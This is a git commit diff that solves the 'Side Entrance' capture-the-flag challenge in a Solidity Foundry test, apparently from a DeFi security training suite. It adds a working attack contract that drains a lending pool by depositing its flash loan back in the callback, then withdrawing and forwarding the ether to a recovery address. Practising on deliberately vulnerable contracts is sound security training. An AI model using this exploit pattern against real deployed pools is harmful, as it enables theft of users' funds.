a2883a802de9ea77c7628e677aff9ababef225d9
hazem-dh <58445913+Hazem-dh@users.noreply.github.com>
2025-09-01 12:21:59 +0200

    solved SideEntrance

--- test/side-entrance/SideEntrance.t.sol
+++ test/side-entrance/SideEntrance.t.sol
@@ -5,6 +5,29 @@ pragma solidity =0.8.25;
 import {Test, console} from "forge-std/Test.sol";
 import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
+contract AttackSideEntrance {
+    SideEntranceLenderPool pool;
+    address recovery;
+
+    constructor(address _pool, address _recovery) {
+        pool = SideEntranceLenderPool(_pool);
+        recovery = _recovery;
+    }
+
+    function Attack() public {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {
+        payable(recovery).transfer(address(this).balance);
+    }
+}
+
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -45,7 +68,8 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        AttackSideEntrance attack = new AttackSideEntrance(address(pool), recovery);
+        attack.Attack();
     }
 
     /**
